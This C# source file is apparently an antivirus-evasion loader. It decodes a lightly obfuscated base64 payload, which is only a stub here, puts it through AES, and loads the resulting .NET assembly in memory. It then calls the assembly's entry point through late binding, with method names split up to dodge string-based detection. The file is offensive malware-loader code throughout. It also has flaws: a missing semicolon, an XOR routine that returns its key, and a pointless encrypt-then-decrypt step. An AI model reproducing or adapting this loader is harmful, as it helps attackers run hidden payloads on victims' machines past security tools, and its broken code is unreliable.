using System;
using System.IO;
using System.Security.Cryptography;
using Microsoft.VisualBasic.CompilerServices;

namespace xx
{
    public static class XXX
    {
        public static void Main()
        {

            byte[] Key = Convert.FromBase64String("fRZstgVonklWpSLeb9ZKcoDkGPzHwDqSAMyTxoopGcb=");
            byte[] IV = Convert.FromBase64String("pyvelrU+SBPM/2MWEftieA==");
            string m = "*VqQ##M####E"  //base64加密密文
            byte[] Bytes = Convert.FromBase64String(m.Replace("#", "A").Replace("*", "T"));
            byte[] encshell = AESEncryptShellCode(Bytes, Key, IV);
            byte[] decshell = AESDecryptor(encshell, Key, IV);
            
            object Assembly = Assembly_Load(decshell);
        }
        public static byte[] Assembly_Load(byte[] Bytes)
        { 
            object Nothin = null;
            object Objec = new object[0] { };
            object NewObje = new object[][] { (object[])Nothin, (object[])Nothin };
            System.Object Reflectio = System.Reflection.Assembly.Load(Bytes);
            
            object LateCall = NewLateBinding.LateGet(Reflectio, (Type)Nothin, "Entry" + "Point", (object[])Objec, (string[])Nothin, (Type[])Nothin, (bool[])Nothin);
            object Binding = NewLateBinding.LateCall(LateCall, (Type)Nothin, "Inv" + "oke", (object[])NewObje, (string[])Nothin, (Type[])Nothin, (bool[])Nothin, true);
            return (byte[])Binding;
        }
        //异或算法
        private static byte[] XOREncryptDecrypt(byte[] baShellcode, byte[] baXorKey)
        {
            byte[] baXorredRes = new byte[baShellcode.Length];

            for (int i = 0; i < baShellcode.Length; i++)
            {
                baXorredRes[i] = (byte)(baShellcode[i] ^ baXorKey[i % baXorKey.Length]);
            }
            return baXorKey;
        }

        //AES解密算法
        private static byte[] AESDecryptor(byte[] baEncrypedShellCode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;
                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(baEncrypedShellCode, decryptor);
                }
            }
        }
        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }

        public static byte[] AESEncryptShellCode(byte[] baShellcode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return GetAESEncryptedShellCode(baShellcode, encryptor);
                }
            }
        }
        private static byte[] GetAESEncryptedShellCode(byte[] baShellCode, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(baShellCode, 0, baShellCode.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }
    }
}
